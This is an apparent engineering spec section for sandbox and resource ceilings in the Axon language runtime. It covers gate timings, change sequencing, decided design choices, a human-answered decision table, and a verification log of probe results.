S20 manifest 423.2 s, S03 316.1 s, S06 PCI 277.9 s, S05 185.9 s, S22 vm parity 84.2 s, and the rest < 55 s each.
`[REVISED: CED-6]` Full strict gate: `tasks/build-loop-gate-lane.md:95` states ≈ 43–55 min. The integrator's brief puts it at
≈ 95 min on this host under load; that figure is the brief's, not measured by me. Budget 2 strict runs (≈ 3.2 h) to allow one
fix-and-retry. `gate.sh --lane` selects units from changed files (`tasks/gate-lane-spec.md` GL-4) and is **not** the gate.

| stage | what | wall (est.) | when |
|---|---|---|---|
| per item | `cargo test -p axon-core --no-default-features --test ceiling` + touched `--lib` unit tests | 1-3 min | each commit |
| per item | `scripts/gate.sh --lane` | 5-15 min [INFERENCE: depends on selection] | each item |
| batch 0 | `cargo check --locked -p axon-core --no-default-features --features asi-runtime` (new gate line, CE-1) | not measured [INFERENCE: minutes cold] | with CE-1 and every later gate |
| CE-5 | `scripts/vm_perf_gate.sh` (perf stat, 3 runs × 6 programs) + `vm_parity.sh` | ~5 min + 84 s | after CE-5 |
| native items | `cargo test --locked -p axon-core --test integration_fixtures` (codegen; `--strict` only, `gate.sh:1196`) | part of the strict gate | CE-2, CE-5, CE-8 |
| CE-9 (C) | spike + `axon_kernel_gate.sh` on a KVM host | ~1 day + 10 min | only if NH-C8 = C |
| end | full `scripts/gate.sh --strict` | ≈ 43–55 min doc / ≈ 95 min brief; ×2 budgeted | at integration |

`[REVISED: CED-5]` Rule: native-refusal tests live in `tests/integration_fixtures.rs` under cfg codegen. Per-item lane runs
do not execute them; only the integrator's strict gate does.

Paid calls: none (`AXON_AI_MOCK=1` throughout; the manual `asi-runtime` acceptance uses a 127.0.0.1 sink). `[REVISED: CED-6]`
Receipt regress: $0. No CE item edits `crates/axon-cortex/src` or `benchmarks/drivers`
(`crates/axon-cortex/benchmarks/scorecard/scorecard.py:89` REPAIR_SOURCES).

Build effort (engineering estimate, lines changed excluding tests/docs): CE-1 ~40 + gate line, CE-2 ~300 (new `ceiling.rs`
loader, flag plumbing, provenance), CE-3 0-20, CE-4 ~80, CE-5 ~250, CE-6 ~40 (+ `ai_calls` ~30), CE-7 ~20, CE-8 (NH-C10) A ~5
/ B ~100-150 + the 2 test rewrites, CE-9 (C) ~100 + fd source + image, CE-10 ~10.

---

## 7. Sequencing and lanes

File-overlap graph (a5310878 anchors):

| file | CE items | siblings |
|---|---|---|
| `interp/builtins.rs` | CE-7 (`:779-781` only), CE-4/CE-6/`ai_calls` (`:6036-6215`) | AsiFixes AF-4/AF-1 (extract arms `:6261-6345`, routing through `:6036-6100`) [pending asi-fixes-spec.md] |
| `builtins.rs` (crate root) | CE-7 (new `dispatch_effect_row` beside `:2742`) | - |
| `interp.rs` | CE-1 (`:4348-4393`), CE-2 (`:5003-5010`, `:7573`, `:7627`), CE-4 (`:5614`, `:6130`), CE-5 (`:5879`) | AsiFixes [INFERENCE: replay paths] [pending asi-fixes-spec.md] |
| `interp/eval.rs`, `interp/vm/*` | CE-5 | LangForms: any new loop form must hit the same step counter (told by message; [INFERENCE] its forms desugar to existing `Expr::For`; the parser builds `Expr::For` at `parser.rs:2082,2121`) |
| `main.rs` | CE-2 (flags `:1069-1167`, `:3720-3740`), CE-5 | - |
| `capabilities.rs` | CE-10 (`:350-363`) | - |
| `axon-ai/src/lib.rs` | CE-8 (`:410-430`, tests `:1533`, `:1760`) | AsiFixes AF-1 (native no-key semantics) [pending asi-fixes-spec.md] |
| `axon-rt/src/lib.rs` | CE-2, CE-5 (`:2127-2160`) | - |
| `interp/provenance.rs` | CE-2 (`:597`) | AsiFixes [INFERENCE: replay records] [pending asi-fixes-spec.md] |
| `scripts/gate.sh`, `governance/gate-lanes.json` | CE-1 (asi-runtime check line) | - |
| `axon-guest-init`, `axon-vm` | CE-9 | - |

`[REVISED: CED-7, CED-8; integrator ruling 4]`
- **Batch 0 = CE-1 and CE-7.** Both build with no NH-C answer and touch no AF window: CE-1 is `interp.rs:4348-4393` plus the
  gate line, CE-7 is `interp/builtins.rs:779-781` plus a new fn in `crates/axon-core/src/builtins.rs`. Neither edits
  `axon-ai`, `builtins.rs:6036-6345` or the extract arms. Batch 0 may merge before AsiFixes. The AF windows above are as the
  sibling stated them in messages; the file `tasks/asi-fixes-spec.md` did not exist at revision time, so re-check the
  windows when it lands [pending asi-fixes-spec.md].
- **After the decisions, one owner, serially** (shared `interp.rs`, `interp/builtins.rs`, `main.rs`, `env_registry.rs`,
  `axon-rt` refusal list):
  1. CE-8 (if NH-C10 = A/B, by the same owner as AF-1's `axon-ai` edits).
  2. CE-2, then CE-10, then CE-3.
  3. CE-4, then CE-6 + `ai_calls` (one gate window; gated on AF-4 only).
  4. CE-5.
- CE-9 is its own lane and its own spec once NH-C8 is answered (VM image and KVM host).

---

## 8. Engineering decisions (decided)

1. CE-1: `[REVISED: CEA#3, CED-3]` pin = (declared hosts, or the implicit host if none) ∩ each set operator list; `*` passes
   all. The logic is in the always-compiled `ai_pin_hosts`, tested in the default build; the ceiling list joins in CE-2.
2. CE-7: the `goal_*` dispatch row is `IO` only, on every sandbox kind; the static row and
   `builtin_effect_row_agrees_with_impurity` are unchanged; dispatch ⊆ static is pinned by a test.
3. CE-8: `[REVISED: CEA#1]` moved to NH-C10 (product); no longer an engineering decision.
4. Ceiling schema: every key required; `null` = explicit unbounded, except `fs_write`, which must be a list (`[REVISED:
   CEA#4]`); unknown key = E1007; the file may not sit inside its own `fs_write` scope; each key enters the schema with its
   enforcing commit. The ceiling cannot be parsed by `serde_json`, which the default build cannot link (`serde-json` is an
   opt-in feature: `crates/axon-core/Cargo.toml` features). Decided: a hand-written strict parser for this flat schema in the
   new `crates/axon-core/src/ceiling.rs`. [INFERENCE: the repo already hand-parses flat JSON in `provenance.rs:471-490`
   `extract_json_str`/`extract_json_num`; those are lenient extractors and are not reused for an authority file.]
5. The ceiling is read once, where the ambient vars are read (`Interp::build_with`), so every executing verb honours
   `AXON_CEILING`. `--ceiling F` sets `AXON_CEILING` for the process before any read (the same pattern as the completion-key
   path, `main.rs:6869-6889`).
6. Step definition and accounting as in CE-5. Exhaustion is E1006 / exit 9. No metered ops without a ceiling. Fused/`purefn`
   tiers are off under a step ceiling.
7. `.env` loading stays allowed under a ceiling. The pin (CE-1) is the control on where traffic goes, so a `.env` redirect is
   refused there. (`forbid_dotenv`, `axon-ai/src/lib.rs:105`, stays NH-R1-only.)
8. Native refuses under every ceiling variable. No native metering is built.

---

## 9. Needs-human (answer in one pass)

| # | question | options (blast radius at a5310878 on 607 check-clean tracked programs unless noted) | recommendation |
|---|---|---|---|
| NH-C1 | Adopt an operator-authored ceiling file `axon-ceiling/1` (`--ceiling` / `AXON_CEILING`) as *the* run bound? Sub-choice per R38:171-175 (no public fs/net/exec freeze before R38 §12 Q5) | **A1** file + digest in provenance, documented as an operator file that is *not* R38's public contract (0; opt-in). **A2** same, scopes written as effect-row entries (0; more design now). **B** only new env vars, no file (0; no single auditable object). **C** keep (0) | **A1** |
| NH-C2 | What does a run with **no** ceiling get? | **A** today's semantics (0). **B** R45 on by default (73 = 12.0 %; ≥ 56 inline tests). **C** B + runtime deny of AI/Net/Exec/Hal/Bpf/Tee effects and `fs:*` (105, after CE-7). **D** literal deny-all (406) | **A**, with a ceiling's presence turning R45 on |
| NH-C3 | Pin the AI endpoint when nothing grants a host (O027)? | **A** pin under any ceiling or ambient net scope (CE-1 rule), document the bare case (0). **B** also pin bare runs to `api.anthropic.com` unless granted (0 tracked; breaks gateway users of `asi-runtime` builds who neither declare nor set `AXON_ALLOWED_NET`). **C** document only | **A** (B if bare runs must also be fenced) |
| NH-C4 | Should `@[ai(policy(budget: N))]` cover callees (O032; amends R3c:33/:45)? | **A** dynamic extent, nested budgets bound each other (0 tracked; 1 test rewritten). **B** keep + document. **C** static refusal (false refusals) | **A** |
| NH-C5 | CPU bound? | **A** opt-in `steps`/`wall_ms` via ceiling/env, interpreter-only (0). **B** A + a default step ceiling for all runs (5 intentional non-terminators change to exit 9; kill-based tests need overrides). **C** document the narrow claim | **A** |
| NH-C6 | Unit of the run token cap? | **A** reserve prompt-bytes+16+`max_tokens`, settle real usage (0 tracked; 1 test's numbers; small guest `budget_tokens` refuse earlier). **B** keep estimate, document it. **C** A + USD cap | **A** (C later if operators ask for dollars) |
| NH-C7 | Should `axon build` accept AI programs (O031/O-HI-03)? | **A** keep; native runs AI only under mock or refuses (already true) (0). **B** refuse at build: 18 direct-AI programs (23 by static row), 4 tests, 8 parity scripts. **C** native audit parity (large) | **A**; stamp O031/O-HI-03 "closed in effect by 105444e6" |
| NH-C8 | Guest substrate FS (O034)? | **A** keep explicit `IO,FS` (0; guests can read any guest file). **B** union FS baseline (0; same hole by default). **C** load-before-gate (spike first; needs an interpreter fd/stdin source). **D** path-scoped `openat` | **C** after a ≤ 1-day spike; D if the spike fails |
| NH-C9 | Should a later NH-R1 envelope bind a `ceiling_sha256` for the runs inside an unattended repair loop? | **A** yes, in a new envelope version after CE-2 ships; the fence passes the ceiling explicitly. **B** no; the envelope's own budget suffices | **A**, deferred (no change to `axon-approval/4`) |
| NH-C10 `[REVISED: CEA#1, CEA#2]` | What does a native AI binary do with **no key and no mock**? Today: a catchable key `Err`, rc 0, where the interpreter gives E1300 rc 5 or the `fallback:` value | **A** always refuse, exit 2 (18 native-buildable direct-AI programs go rc 0 → 2; `ai_fallback.ax` exits 2 where the interpreter prints its fallback; 2 axon-ai tests rewritten). **B** mirror the interpreter: fallback value or E1300 exit 5 (byte parity; ABI change ~100-150 lines; same 2 tests rewritten). **C** keep + document (silent wrong answer stays) | **B** (A if B's ABI change is declined) |

`[DECIDED by human 2026-11-02: the recommendations column - NH-C1 A1, NH-C2 A (a ceiling's presence turns R45 on),
NH-C3 A, NH-C4 A, NH-C5 A, NH-C6 A, NH-C7 A (stamp O031/O-HI-03 closed in effect by 105444e6), NH-C8 C after a
≤ 1-day spike (D if the spike fails), NH-C9 A deferred (no change to axon-approval/4), NH-C10 B (A if B's ABI change
is declined at build time).]`

`[REVISED: CED-8; integrator ruling 4]` **Batch 0, buildable without any answer: CE-1 and CE-7.** CE-7 makes a refusal
narrower, and its guards keep model-reaching `goal_*` calls refused. CE-1 refuses only an AI call whose endpoint leaves the
operator's stated `AXON_ALLOWED_NET`, in `asi-runtime` builds; it has no effect in the default build. CE-8's no-key half is
**not** in batch 0 (NH-C10).

---

## 10. Verification log (what was run, at a5310878, reference binary)

| probe | result |
|---|---|
| b01 / b03 / b05 budget | rc 0 "3" / E1301 rc 5 / rc 0 "6" |
| t01 token cap 1 / 2 | E1303 rc 5 / rc 0 |
| `AXON_BUDGET_TOKENS=0` b01 | E1303 naming `helper`, rc 5 |
| c01 plain / `--require-contained` / `AXON_ALLOWED_NET=` | rc 0 / E1005 rc 2 / exit 8 |
| c03 plain / `--require-contained` | rc 0 / E1005 rc 2 |
| s01 tree, vm under `timeout 5` | rc 124 both |
| s03 20 M iterations | vm 0.54 s, tree 4.77 s, native 0.01 s |
| native s03 under `AXON_BUDGET_TOKENS` / `AXON_ALLOWED_EFFECTS` | refusal rc 2 both |
| n01 interp / native no key / native dummy key + local sink / native mock | E1300 rc 5 / Err rc 0 / refusal rc 2, no connection / rc 0 |
| n02 interp / native (no key) | `FB` / `err=...` (both rc 0) |
| goal_run_hillclimb under `AXON_ALLOWED_EFFECTS=IO` | exit 8 |
| g01 metric AI under empty net scope | exit 8 at `ai_complete` |
| corpus: check / R45 / caps over 699 files; run 449 with mock, 30 s | numbers in §2; scan.json |
| Step 1 recounts (scan.json, comments/strings stripped) | 19 direct / 22 goal-only AI; option C 126 → 105; only goal-only R45 refusal `persistent_learner.ax` |
| native rebuild of all 41 AI programs | direct 18/19 build (`llm_cache` E0701/E0910); goal-only 5/22 build (17 E0910) |
| g02 (`goal_run` with pure metric in a `sandbox_create(p, "IO")` sandbox) | exit 8 at `goal_run` |
| `AXON_ENGINE=vm AXON_VM_TRACE=1` s03 | `vm: pure main 0 exprs, 1 loops` |
| `axon run -` | `must have a .ax extension (got '-')`, rc 1 |
| c01 under mock, `AXON_ALLOWED_NET=gw.example`, `AXON_AI_BASE_URL=https://gw.example` | exit 8: dispatch checks the implicit host `api.anthropic.com` |
| axon-vm grant override vs manifest (2026-09-22 axon-vm build) | `OverrideWidens` rc 2 |

Not run: any `asi-runtime` build (none exists at a5310878); the microVM boot (no guest image in this worktree; the gate
needs cargo); `vm_perf_gate.sh`. Each claim that depends on them is marked [INFERENCE].
